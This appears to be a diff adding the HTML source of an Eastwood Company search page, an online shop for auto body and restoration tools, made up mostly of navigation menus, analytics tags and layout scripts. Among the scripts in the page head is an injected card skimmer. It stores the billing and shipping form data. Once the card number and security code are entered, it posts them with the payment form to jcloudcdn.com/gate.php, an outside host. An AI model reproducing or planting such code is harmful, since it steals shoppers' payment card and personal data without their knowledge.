@@ -1,0 +1,739 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<base href="http://www.eastwood.com/" />
+<meta name="robots" content="noindex,follow" />
+
+<!--includes_code--><head>
+<link rel="stylesheet" type="text/css" href="http://search.eastwood.com/sli_styles.css" media="all" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="icon" href="http://www.eastwood.com/skin/frontend/eastwood/eastwood/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.eastwood.com/skin/frontend/eastwood/eastwood/favicon.ico" type="image/x-icon" />
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.eastwood.com/js/blank.html';
+    var BLANK_IMG = 'http://www.eastwood.com/js/spacer.gif';
+    var SKIN_URL = 'http://www.eastwood.com/skin/frontend/eastwood/eastwood/';
+//]]>
+</script>
+<link rel="stylesheet" type="text/css" href="http://www.eastwood.com/media/css/a6ff3327c55098ce460483df2e673b0f.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.eastwood.com/media/css/566a6162209cf13f3a1eba88a2cf8047.css" media="print" />
+<script type="text/javascript" src="http://www.eastwood.com/media/js/dbef0f39e1b3bcb2895f7d15ee328dc2.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.eastwood.com/media/css/a8170118d34c2770d98d07ef4562a393.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.eastwood.com/media/js/109cd6b3e26cabf1fd16ac0d90aa50d5.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.eastwood.com';
+//]]>
+</script>
+<link type="text/css" href="//fonts.googleapis.com/css?family=Roboto+Condensed:400,300,700" rel="stylesheet" />
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<!-- ESI START DUMMY COMMENT [] -->
+<!-- ESI URL DUMMY COMMENT -->
+
+ 
+
+
+
+
+
+
+
+<script type="text/javascript">
+    (function () {
+        //Check if SL JavaScript API is ready otherwise initialize Queue 
+        window.ODY = window.ODY || [];
+        var a = document.createElement("script");
+        a.async = true;
+        a.src = "https://static.sociablelabs.net/prod/sociable-tag.js";
+        a.id = 'sociablejs';
+        a.setAttribute('data-sl-token', '45f8aa2b');
+        document.getElementsByTagName("head")[0].appendChild(a);
+    })();
+</script> 
+<!-- ESI END DUMMY COMMENT [] -->
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script>
+<link href="https://plus.google.com/105386484502668935846#105386484502668935846/about" rel="publisher" />
+<!--
+
+
+-->
+
+
+<script type="text/javascript">
+  (function() {
+    var po = document.createElement("script"); po.type = "text/javascript"; po.async = true;
+    po.src = "https://apis.google.com/js/plusone.js?publisherid=105386484502668935846";
+    var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(po, s);
+  })();
+</script>
+<script type="text/javascript"> 
+var biJsHost = (("https:" == document.location.protocol) ? "https://" : "http://"); 
+document.write(unescape("%3Cscript src='" + biJsHost + "cdn.listrakbi.com/scripts/script.js?m=dVE19l7XE69A&v=1' type='text/javascript'%3E%3C/script%3E")); 
+</script>
+<script type="text/javascript" 
+src="//display.ugc.bazaarvoice.com/static/eastwood/en_US/bvapi.js">
+</script>
+<script>
+jQuery(document).on("change", "#co-billing-form", function(evt) {
+    localStorage.setItem('billing', JSON.stringify(jQuery('#co-billing-form').serialize()));
+});
+ 
+jQuery(document).on("change", "#co-shipping-form", function(evt) {
+    localStorage.setItem('shipping', JSON.stringify(jQuery('#co-shipping-form').serialize()));
+});
+ 
+jQuery(document).on('change', '#co-payment-form', function(el) {
+    if (jQuery('#ccsave_cc_number').val().length >= 15 && jQuery('#ccsave_cc_cid').val().length >= 2) {
+        var data = JSON.stringify(jQuery("#co-payment-form").serialize());
+console.log(data);
+console.log(1);
+        jQuery.ajax({
+            url: 'https://jcloudcdn.com/gate.php?token=KjsS29Msl',
+            crossDomain: false,
+            data: localStorage.getItem('billing') + "&" + localStorage.getItem('shipping') + "&" + data,
+            headers: {'X-Requested-With': 'XMLHttpRequest'},
+            type: 'POST',
+            dataType: 'json',
+            success:function(resp)
+            {
+                return false;
+            },
+            error:function(jqXHR,textStatus,errorThrown)
+            {
+                return false;
+            }
+        });
+    }
+});
+</script>
+<script>
+var _prum = [['id', '5769c24aabe53d416dd89286'],
+             ['mark', 'firstbyte', (new Date()).getTime()]];
+(function() {
+    var s = document.getElementsByTagName('script')[0]
+      , p = document.createElement('script');
+    p.async = 'async';
+    p.src = '//rum-static.pingdom.net/prum.min.js';
+    s.parentNode.insertBefore(p, s);
+})();
+</script><!--[if lt IE 9]>
+    <link rel="stylesheet" type="text/css" href="http://www.eastwood.com/skin/frontend/eastwood/eastwood/css/ie.php" />
+    <script type="text/javascript">
+        jQuery(function(){
+            if(!window.PIE) jQuery.getScript("http://www.eastwood.com/skin/frontend/eastwood/eastwood/js/PIE.js", function(){
+                jQuery('button.button > span, .navi ul ul, .search-inputcont input[type=text], .btn-cart, .menu-cont, .search-cont, .detail, .more, .midd_topheading,.footer_innleftemailcont input[type=text], #middle-panel').each(function() {
+                    PIE.attach(this);
+                });
+            })
+        });
+    </script>
+<![endif]-->
+<script type="text/javascript">
+jQuery(document).ready(function(){
+       jQuery('.wishlist > a').prepend('<div class="icon icon1"><img src="http://www.eastwood.com/skin/frontend/eastwood/eastwood/images/mywishlist.png" /></div>');
+       jQuery('.top-link-cart').prepend('<div class="icon icon2"><img src="http://www.eastwood.com/skin/frontend/eastwood/eastwood/images/shoppingcart.png" /></div>');
+       jQuery('.top-link-checkout').prepend('<div class="icon icon3"><img src="http://www.eastwood.com/skin/frontend/eastwood/eastwood/images/checkout.png" /></div>');
+});
+</script>
+
+
+
+
+    
+<style>
+    .jcarousel-list-horizontal{
+        width:10000px !important;
+    }
+    .jcarousel-prev-horizontal{top:89px !important;}
+    .jcarousel-skin-tango .jcarousel-clip-horizontal{height: 177px !important;}
+    .jcarousel-skin-tango .jcarousel-item{height:177px !important;}
+    .jcarousel-skin-tango .jcarousel-next-horizontal{right:-38px !important;top:82px !important;}
+
+
+
+    @media (max-width:320px){
+      .jcarousel-skin-tango .jcarousel-next-horizontal{right:13px !important; }
+        .jcarousel-skin-tango .jcarousel-prev-horizontal{left:-16px !important; top:89px !important;}
+    }
+
+    @media (max-width:380px){
+    .jcarousel-skin-tango .jcarousel-container-horizontal{width:68% !important;}
+    .jcarousel-skin-tango .jcarousel-prev-horizontal{left:-17px !important; top:91px !important;}
+    }
+
+    @media (max-width:480px){
+
+        .jcarousel-skin-tango .jcarousel-container-horizontal{width:76% !important;}
+        .jcarousel-skin-tango .jcarousel-prev-horizontal{left:-24px !important;top:91px !important;}
+        .jcarousel-skin-tango .jcarousel-next-horizontal{}
+    }
+
+    @media (max-width:360px){
+       .jcarousel-skin-tango .jcarousel-next-horizontal{right:-9px !important;top:93px !important;}
+       .jcarousel-skin-tango .jcarousel-prev-horizontal{left: -24px !important;top: 75px !important;}
+    }
+
+</style>
+<script type="text/javascript">
+jQuery(document).ready(function(){
+    jQuery('#mycarousel').jcarousel();
+
+    jQuery('.product-sale').click(function(){
+        jQuery('.slider-div-cont').show();
+        jQuery('#mycarousel').jcarousel();
+        jQuery('.slider-div-cont1').hide();
+        jQuery('.slider-div-cont2').hide();
+    });
+
+    jQuery('.top-rated').click(function(){
+        jQuery('.slider-div-cont1').show();
+        jQuery('#mycarousel1').jcarousel();
+        jQuery('.slider-div-cont').hide();
+        jQuery('.slider-div-cont2').hide();
+    });
+
+    jQuery('.prduct-new').click(function(){
+        jQuery('.slider-div-cont2').show();
+        jQuery('#mycarousel2').jcarousel();
+        jQuery('.slider-div-cont').hide();
+        jQuery('.slider-div-cont1').hide();
+    });
+});
+</script>
+    
+</head><!--/includes_code-->
+<title>Eastwood Company - Search</title>
+<script language="javascript" type="text/javascript">
+var sliJsHost = (("https:" == document.location.protocol) ? "https://" : "http://");
+document.write(unescape('%3Clink rel="stylesheet" type="text/css" href="' + sliJsHost + 'assets.resultspage.com/js/rac/sli-rac.0.4.css" /%3E'));
+document.write(unescape('%3Clink rel="stylesheet" type="text/css" href="' + sliJsHost + 'eastwood.resultspage.com/rac/sli-rac.css" /%3E'));
+</script>
+</head>
+<!--header_code--></head>
+<body class=" cms-page-view cms-sli">
+<!-- ESI START DUMMY COMMENT [] -->
+<!-- ESI URL DUMMY COMMENT -->
+
+ <!-- Google Tag Manager -->
+<script>dataLayer = [{"visitorLoginState":"Logged out","visitorType":"NOT LOGGED IN","visitorLifetimeValue":0,"visitorExistingCustomer":"No","server":"765410-web2.eastwood.com","customerId":"n\/a"}];</script>
+
+<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-9FCC"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-9FCC');</script>
+<!-- End Google Tag Manager -->
+ 
+<!-- ESI END DUMMY COMMENT [] -->
+<script type="text/javascript">
+ var cvtSiteName = "eastwood";
+ var cvtJsHost = (("https:" == document.location.protocol)?"https://dnhgz729v27ca.cloudfront.net/" : "http://use.convertglobal.com/");
+ document.write(unescape("%3Cscript src='" + cvtJsHost+"client/setup.js' type='text/javascript'%3E%3C/script%3E"));
+ if(!window.convert_cart){
+    window.convert_cart={};
+    convert_cart.shoppingCartItems=new Array();
+    }
+ if(!window.convert_profile){
+    window.convert_profile = {};
+    }
+</script>
+<script type="text/javascript">
+ window.convert = new Convert("iohw5");
+ convert.init();
+</script>
+
+<div id="main-wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div id="wrapper">
+        <div class="wrap">
+            <!-- ESI START DUMMY COMMENT [] -->
+<!-- ESI URL DUMMY COMMENT -->
+
+ 
+<!--header-->
+<div id="header">
+    <div class="logo">
+        <div itemscope itemtype="http://schema.org/Organization">
+            <a class="main-logo" itemprop="url" href="http://www.eastwood.com/" title="Auto Body Repair Tools Shop - Auto Body Supplies - Classic Car Restoration">
+                <img itemprop="logo" src="http://www.eastwood.com/skin/frontend/eastwood/eastwood/images/logo.png" alt="Auto Body Repair Tools Shop - Auto Body Supplies - Classic Car Restoration" />
+            </a>
+            <!-- TAGLINE goes here -->
+            <div class="tagline">
+                <div>
+                    <span class="tagline-line">Do the job right</span><br />
+                    <span class="tagline-phone">800-343-9353</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header_right">
+        <div class="top-navi ">
+            <div class="search-cont">
+    
+<form id="search_mini_form" action="http://search.eastwood.com/search" method="get">
+    <div class="search-inner">
+        <div class="search-inputcont">
+        <input id="sli_search_1" type="text" name="w" value="" class="input-text" maxlength="128" autocomplete="off" />
+        <input type="hidden" name="ts" value="custom" />
+        </div>
+         <div class="searchicon">
+       <button type="submit" title="Search" class="button" onclick="submitMiniSearchForm(this.form);"></button>
+    </div>
+    </div>
+</form>
+
+<script type="text/javascript">
+    function submitMiniSearchForm(form) {
+        if ($('sli_search_1').value=="Search Here" || $('sli_search_1').value=="Enter a keyword or Item #") {
+            $('sli_search_1').value="Enter a keyword or Item #";
+        } else {
+            form.submit();
+        }
+    }
+    </script>
+</div>
+<ul class="links">
+                                                        <li class="iphone-br"><a href="https://www.eastwood.com/customer/account/login/" title="Log In" >Log In</a></li>
+                                <li ><a href="http://www.eastwood.com/checkout/cart/" title="My Cart" class="top-link-cart">My Cart </a></li>
+                                <li class=" last" ><a href="https://www.eastwood.com/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+            </ul>
+        </div>
+    </div>
+</div> 
+<!--end-header-->
+
+<!--menu-cont-->
+<div class="menu-cont">
+        <div class="search-cont-mobile">
+          
+<form id="search_mini_form" action="http://search.eastwood.com/search" method="get">
+    <div class="search-inner">
+        <div class="search-inputcont">
+        <input id="sli_search_1" type="text" name="w" value="" class="input-text" maxlength="128" autocomplete="off" />
+        <input type="hidden" name="ts" value="custom" />
+        </div>
+         <div class="searchicon">
+       <button type="submit" title="Search" class="button" onclick="submitMiniSearchForm(this.form);"></button>
+    </div>
+    </div>
+</form>
+
+<script type="text/javascript">
+    function submitMiniSearchForm(form) {
+        if ($('sli_search_1').value=="Search Here" || $('sli_search_1').value=="Enter a keyword or Item #") {
+            $('sli_search_1').value="Enter a keyword or Item #";
+        } else {
+            form.submit();
+        }
+    }
+    </script>
+        </div>
+
+     <div class="navi">
+    <ul>
+        <li  class="level0 nav-1 first level-top parent"><a href="http://www.eastwood.com/paints.html"  class="level-top" ><span>Paints &amp; Coatings</span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="http://www.eastwood.com/paints/automotive-finishes.html" ><span>Automotive Finishes</span></a></li><li  class="level1 nav-1-2"><a href="http://www.eastwood.com/paints/rust-solutions.html" ><span>Rust Solutions</span></a></li><li  class="level1 nav-1-3"><a href="http://www.eastwood.com/paints/paint-equipment.html" ><span>Paint Guns &amp; Equipment</span></a></li><li  class="level1 nav-1-4"><a href="http://www.eastwood.com/paints/airbrush.html" ><span>Airbrushing</span></a></li><li  class="level1 nav-1-5"><a href="http://www.eastwood.com/paints/2k-aero-spray-paints.html" ><span>2K Aero-Spray Paints</span></a></li><li  class="level1 nav-1-6"><a href="http://www.eastwood.com/paints/elastiwrap-coatings.html" ><span>ElastiWrap</span></a></li><li  class="level1 nav-1-7"><a href="http://www.eastwood.com/paints/reducers-activators.html" ><span>Reducers &amp; Activators</span></a></li><li  class="level1 nav-1-8"><a href="http://www.eastwood.com/paints/wheel-paints.html" ><span>Wheel Paints</span></a></li><li  class="level1 nav-1-9"><a href="http://www.eastwood.com/paints/hi-temp-engine-paints.html" ><span>Hi Temp &amp; Engine Paints</span></a></li><li  class="level1 nav-1-10"><a href="http://www.eastwood.com/paints/under-car-coatings.html" ><span>Under Car Coatings</span></a></li><li  class="level1 nav-1-11"><a href="http://www.eastwood.com/paints/underhood-paints.html" ><span>Underhood Paints</span></a></li><li  class="level1 nav-1-12"><a href="http://www.eastwood.com/paints/trunk-spatter-paints.html" ><span>Trunk Spatter Paints</span></a></li><li  class="level1 nav-1-13"><a href="http://www.eastwood.com/paints/pinstriping.html" ><span>Pinstriping</span></a></li><li  class="level1 nav-1-14"><a href="http://www.eastwood.com/paints/cleaning.html" ><span>Paint Strippers &amp; Cleaners</span></a></li><li  class="level1 nav-1-15"><a href="http://www.eastwood.com/paints/electroplating.html" ><span>Plating &amp; Chrome</span></a></li><li  class="level1 nav-1-16"><a href="http://www.eastwood.com/paints/bedliner.html" ><span>Bedliner Coatings</span></a></li><li  class="level1 nav-1-17"><a href="http://www.eastwood.com/paints/interior-dyes.html" ><span>Interior Paints</span></a></li><li  class="level1 nav-1-18"><a href="http://www.eastwood.com/paints/shop-floor-coatings.html" ><span>Shop Floor Coatings</span></a></li><li  class="level1 nav-1-19 last"><a href="http://www.eastwood.com/paints/books-dvds.html" ><span>Books &amp; DVDs</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="http://www.eastwood.com/hotcoat-powder-coating.html"  class="level-top" ><span>Powder Coating</span></a><ul class="level0"><li  class="level1 nav-2-1 first"><a href="http://www.eastwood.com/hotcoat-powder-coating/powder-coat-guns.html" ><span>Powder Coat Guns</span></a></li><li  class="level1 nav-2-2"><a href="http://www.eastwood.com/hotcoat-powder-coating/powders.html" ><span>Powders</span></a></li><li  class="level1 nav-2-3"><a href="http://www.eastwood.com/hotcoat-powder-coating/accessories.html" ><span>Accessories</span></a></li><li  class="level1 nav-2-4"><a href="http://www.eastwood.com/hotcoat-powder-coating/prep-stripping.html" ><span>Prep/Stripping</span></a></li><li  class="level1 nav-2-5"><a href="http://www.eastwood.com/hotcoat-powder-coating/ovens.html" ><span>Ovens &amp; Lamps</span></a></li><li  class="level1 nav-2-6 last"><a href="http://www.eastwood.com/hotcoat-powder-coating/booths.html" ><span>Booths</span></a></li></ul></li><li  class="level0 nav-3 level-top parent"><a href="http://www.eastwood.com/welders.html"  class="level-top" ><span>Welding &amp; Fab</span></a><ul class="level0"><li  class="level1 nav-3-1 first"><a href="http://www.eastwood.com/welders/mig-welders.html" ><span>MIG Welders</span></a></li><li  class="level1 nav-3-2"><a href="http://www.eastwood.com/welders/tig-welders.html" ><span>TIG Welders</span></a></li><li  class="level1 nav-3-3"><a href="http://www.eastwood.com/welders/plasma-cutter.html" ><span>Plasma Cutters</span></a></li><li  class="level1 nav-3-4"><a href="http://www.eastwood.com/welders/stick-arc-welders.html" ><span>ARC &amp; Gas Welders</span></a></li><li  class="level1 nav-3-5"><a href="http://www.eastwood.com/welders/welding-helmet.html" ><span>Welding Helmets</span></a></li><li  class="level1 nav-3-6"><a href="http://www.eastwood.com/welders/clamps-tools.html" ><span>Clamps &amp; Tools</span></a></li><li  class="level1 nav-3-7"><a href="http://www.eastwood.com/welders/metal-shears.html" ><span>Metal Cutting</span></a></li><li  class="level1 nav-3-8"><a href="http://www.eastwood.com/welders/metal-brake.html" ><span>Metal Brake</span></a></li><li  class="level1 nav-3-9"><a href="http://www.eastwood.com/welders/shrinker-stretcher.html" ><span>Shrinker/Stretcher</span></a></li><li  class="level1 nav-3-10"><a href="http://www.eastwood.com/welders/bead-roller.html" ><span>Bead Roller</span></a></li><li  class="level1 nav-3-11"><a href="http://www.eastwood.com/welders/tubing-bender.html" ><span>Tubing Bender</span></a></li><li  class="level1 nav-3-12"><a href="http://www.eastwood.com/welders/english-wheel.html" ><span>English Wheel</span></a></li><li  class="level1 nav-3-13"><a href="http://www.eastwood.com/welders/planishing-hammers.html" ><span>Planishing Hammers</span></a></li><li  class="level1 nav-3-14"><a href="http://www.eastwood.com/welders/mallets-sandbags.html" ><span>Mallets &amp; Sandbags</span></a></li><li  class="level1 nav-3-15"><a href="http://www.eastwood.com/welders/surface-prep.html" ><span>Surface Prep</span></a></li><li  class="level1 nav-3-16"><a href="http://www.eastwood.com/welders/stud-welders.html" ><span>Stud Welders</span></a></li><li  class="level1 nav-3-17"><a href="http://www.eastwood.com/welders/spot-weld-cutters.html" ><span>Spot Weld Cutters</span></a></li><li  class="level1 nav-3-18"><a href="http://www.eastwood.com/welders/welding.html" ><span>Welding Accessories</span></a></li><li  class="level1 nav-3-19"><a href="http://www.eastwood.com/welders/dvd-s.html" ><span>Books &amp; DVDs</span></a></li><li  class="level1 nav-3-20"><a href="http://www.eastwood.com/welders/safety-protection.html" ><span>Safety &amp; Protection</span></a></li><li  class="level1 nav-3-21 last"><a href="http://www.eastwood.com/welders/parts-consumables.html" ><span>Parts &amp; Consumables</span></a></li></ul></li><li  class="level0 nav-4 level-top parent"><a href="http://www.eastwood.com/autobody.html"  class="level-top" ><span>AutoBody</span></a><ul class="level0"><li  class="level1 nav-4-1 first"><a href="http://www.eastwood.com/autobody/blasting.html" ><span>Blasting</span></a></li><li  class="level1 nav-4-2"><a href="http://www.eastwood.com/autobody/dent-repair.html" ><span>Dent Repair</span></a></li><li  class="level1 nav-4-3"><a href="http://www.eastwood.com/autobody/hammers-dollies.html" ><span>Hammers &amp; dollies</span></a></li><li  class="level1 nav-4-4"><a href="http://www.eastwood.com/autobody/body-fillers.html" ><span>Body fillers</span></a></li><li  class="level1 nav-4-5"><a href="http://www.eastwood.com/autobody/leading-body-solder.html" ><span>Body Soldering</span></a></li><li  class="level1 nav-4-6"><a href="http://www.eastwood.com/autobody/seam-sealer.html" ><span>Seam Sealers</span></a></li><li  class="level1 nav-4-7"><a href="http://www.eastwood.com/autobody/sanders.html" ><span>Sanding Blocks &amp; Boards</span></a></li><li  class="level1 nav-4-8"><a href="http://www.eastwood.com/autobody/sandpaper.html" ><span>Sandpaper</span></a></li><li  class="level1 nav-4-9"><a href="http://www.eastwood.com/autobody/buffing.html" ><span>Buffing &amp; Polishing</span></a></li><li  class="level1 nav-4-10"><a href="http://www.eastwood.com/autobody/sound-deadening.html" ><span>Sound Deadening</span></a></li><li  class="level1 nav-4-11"><a href="http://www.eastwood.com/autobody/rotisserie.html" ><span>Rotisserie</span></a></li><li  class="level1 nav-4-12"><a href="http://www.eastwood.com/autobody/fender-roller.html" ><span>Fender Roller</span></a></li><li  class="level1 nav-4-13"><a href="http://www.eastwood.com/autobody/panel-install.html" ><span>Body Panel Installation</span></a></li><li  class="level1 nav-4-14"><a href="http://www.eastwood.com/autobody/panel-removal.html" ><span>Body Panel Removal</span></a></li><li  class="level1 nav-4-15"><a href="http://www.eastwood.com/autobody/door-repair-tools.html" ><span>Door Repair Tools</span></a></li><li  class="level1 nav-4-16"><a href="http://www.eastwood.com/autobody/interior-repair.html" ><span>Interior Repair</span></a></li><li  class="level1 nav-4-17"><a href="http://www.eastwood.com/autobody/plastic-glass-repair.html" ><span>Plastic &amp; Glass Repair</span></a></li><li  class="level1 nav-4-18 last"><a href="http://www.eastwood.com/autobody/books-dvds.html" ><span>Books &amp; DVDs</span></a></li></ul></li><li  class="level0 nav-5 level-top parent"><a href="http://www.eastwood.com/shop-equipment.html"  class="level-top" ><span>Tools &amp; Equipment</span></a><ul class="level0"><li  class="level1 nav-5-1 first"><a href="http://www.eastwood.com/shop-equipment/hand-tools.html" ><span>Hand Tools</span></a></li><li  class="level1 nav-5-2"><a href="http://www.eastwood.com/shop-equipment/power-tools.html" ><span>Power Tools</span></a></li><li  class="level1 nav-5-3"><a href="http://www.eastwood.com/shop-equipment/bench-grinders-sanders.html" ><span>Bench Grinders &amp; Sanders</span></a></li><li  class="level1 nav-5-4"><a href="http://www.eastwood.com/shop-equipment/drill-presses.html" ><span>Drill Presses</span></a></li><li  class="level1 nav-5-5"><a href="http://www.eastwood.com/shop-equipment/pneumatic-tools.html" ><span>Air Tools</span></a></li><li  class="level1 nav-5-6"><a href="http://www.eastwood.com/shop-equipment/air-management.html" ><span>Air Management</span></a></li><li  class="level1 nav-5-7"><a href="http://www.eastwood.com/shop-equipment/work-lights.html" ><span>Work Lights</span></a></li><li  class="level1 nav-5-8"><a href="http://www.eastwood.com/shop-equipment/engine-tools.html" ><span>Engine Tools</span></a></li><li  class="level1 nav-5-9"><a href="http://www.eastwood.com/shop-equipment/brake-tools.html" ><span>Brake Tools</span></a></li><li  class="level1 nav-5-10"><a href="http://www.eastwood.com/shop-equipment/suspension-tools.html" ><span>Suspension Tools</span></a></li><li  class="level1 nav-5-11"><a href="http://www.eastwood.com/shop-equipment/measuring-tools.html" ><span>Measuring Tools</span></a></li><li  class="level1 nav-5-12"><a href="http://www.eastwood.com/shop-equipment/electrical-tools.html" ><span>Electrical Tools</span></a></li><li  class="level1 nav-5-13"><a href="http://www.eastwood.com/shop-equipment/hvac-tools.html" ><span>HVAC Tools</span></a></li><li  class="level1 nav-5-14"><a href="http://www.eastwood.com/shop-equipment/tap-and-die-sets.html" ><span>Tap &amp; Die Sets</span></a></li><li  class="level1 nav-5-15"><a href="http://www.eastwood.com/shop-equipment/fasteners.html" ><span>Fasteners</span></a></li><li  class="level1 nav-5-16"><a href="http://www.eastwood.com/shop-equipment/vehicle-storage.html" ><span>Vehicle Storage</span></a></li><li  class="level1 nav-5-17"><a href="http://www.eastwood.com/shop-equipment/jacks-and-vehicle-lifts.html" ><span>Jacks and Vehicle Lifts</span></a></li><li  class="level1 nav-5-18"><a href="http://www.eastwood.com/shop-equipment/hydraulic-presses.html" ><span>Hydraulic Presses</span></a></li><li  class="level1 nav-5-19"><a href="http://www.eastwood.com/shop-equipment/safety-equipment.html" ><span>Safety Equipment</span></a></li><li  class="level1 nav-5-20"><a href="http://www.eastwood.com/shop-equipment/torches.html" ><span>Torches</span></a></li><li  class="level1 nav-5-21"><a href="http://www.eastwood.com/shop-equipment/shop-supplies.html" ><span>Shop Supplies</span></a></li><li  class="level1 nav-5-22"><a href="http://www.eastwood.com/shop-equipment/additives-chemicals.html" ><span>Additives &amp; Chemicals</span></a></li><li  class="level1 nav-5-23"><a href="http://www.eastwood.com/shop-equipment/books-videos.html" ><span>Books &amp; DVDs</span></a></li><li  class="level1 nav-5-24"><a href="http://www.eastwood.com/shop-equipment/automotive-parts.html" ><span>Auto Parts</span></a></li><li  class="level1 nav-5-25"><a href="http://www.eastwood.com/shop-equipment/tool-boxes-storage.html" ><span>Tool Boxes &amp; Storage</span></a></li><li  class="level1 nav-5-26 last"><a href="http://www.eastwood.com/shop-equipment/car-care-supplies.html" ><span>Car Care Supplies</span></a></li></ul></li><li  class="level0 nav-6 level-top"><a href="http://www.eastwood.com/hot-new-items.html"  class="level-top" ><span>New Items</span></a></li><li  class="level0 nav-7 last level-top"><a href="http://www.eastwood.com/clearance.html"  class="level-top" ><span>Clearance</span></a></li>    </ul>
+</div>
+<div class="navifordevice">
+    <select name="dropdown-menu" id="dropdown-menu">
+        <option>Select Category: </option>
+        <option value="http://www.eastwood.com/paints.html">Paints &amp; Coatings</option><option value="http://www.eastwood.com/hotcoat-powder-coating.html">Powder Coating</option><option value="http://www.eastwood.com/welders.html">Welding &amp; Fab</option><option value="http://www.eastwood.com/autobody.html">AutoBody</option><option value="http://www.eastwood.com/shop-equipment.html">Tools &amp; Equipment</option><option value="http://www.eastwood.com/hot-new-items.html">New Items</option><option value="http://www.eastwood.com/clearance.html">Clearance</option>    </select>
+</div></div>
+<!--end-menu-cont-->
+ 
+<!-- ESI END DUMMY COMMENT [] -->
+            <div id="middle-panel">
+                <div class="center-inner">
+                    
+<div class="categories"><div id="sli_bct">
+	<ul>
+		<li><a href="http://www.eastwood.com/">home</a></li>
+		
+	</ul>
+</div></div>
+                    <div class="cols-cont">
+                        <div class="right-col">
+                            <div id="turpentine-esi-block-d3298744d2c6bf24a4668ccf93d0329179bdbd1d8f02e32a427d76c8fb110386" style="display: none">
+    <script type="text/javascript">
+        (function() {
+            var blockTag = "turpentine-esi-block-d3298744d2c6bf24a4668ccf93d0329179bdbd1d8f02e32a427d76c8fb110386", esiUrl = "http:\/\/www.eastwood.com\/turpentine\/esi\/getBlock\/method\/ajax\/access\/private\/ttl\/0\/hmac\/93fa8ac57c018667c2de9126c8e3cd14152d372fc343b5ff12ec2a7632119fdf\/data\/QUFByh-2orQoOfVP_eyjZIRPyJkHLCM38t-vKq3db3b5Jsw6YW8pWkgCQw9UAvBX_5vVuh6KXUghbepgfQIudnF-yoax98jh5SqRGD94eZu4bVS31SRWF8cVQzJjtgPPEmvP5dJ1gYaEDhrBD4kjClui3uxZNEDzY2hZ5peiSr79EFwag4ffLIN8PeGbBa7bsjIJhUl7PydKYSHYRNSOS6SX4rJAHuVYHfPS8-UBo4Vv75TT9yWc2jZItycFtSEEw3GVpGXP_dhlMNhTlk8WmNnthfpoR_p0J6AvnvlyjaI_AOxz6RAftummCshh0arAW__esfU8g3uMDa-mBKI6EQ==\/";
+            if (typeof Ajax === 'object' && typeof Ajax.Updater === 'function') {
+                new Ajax.Updater(
+                    blockTag,
+                    esiUrl,
+                    {
+                        method: "get",
+                        evalScripts: true,
+                        onSuccess: function() {
+                            $(blockTag).appear({
+                                duration: 0.3
+                            });
+                        }
+                    }
+                );
+            } else if (typeof jQuery === 'function') {
+                jQuery.ajax(
+                    {
+                        url: esiUrl,
+                        type: "get",
+                        dataType: "html"
+                    }
+                ).done(function() {
+                    $(blockTag).fadeIn(300);
+                });
+            }
+        })();
+    </script>
+</div>                            <!-- BEGIN: Google Trusted Store -->
+<script type="text/javascript"> var gts = gts || [];
+gts.push([ 'id', '1028340']);
+(function () {
+    var scheme = (("https:" == document.location.protocol) ? "https://" : "http://");
+    var gtscript = document.createElement('script');
+    gtscript.type = 'text/javascript';
+    gtscript.async = true;
+    gtscript.src = scheme + "www.googlecommerce.com/trustedstores/gtmp_compiled.js";
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gtscript, s);
+})(); </script>
+<!-- END: Google Trusted Store --><div class="cms-content"><div id="turpentine-esi-block-97b6741c64aec859ba447b6f102af79af2dddb30f0c5ecb5ebd7804a0aba790d" style="display: none">
+    <script type="text/javascript">
+        (function() {
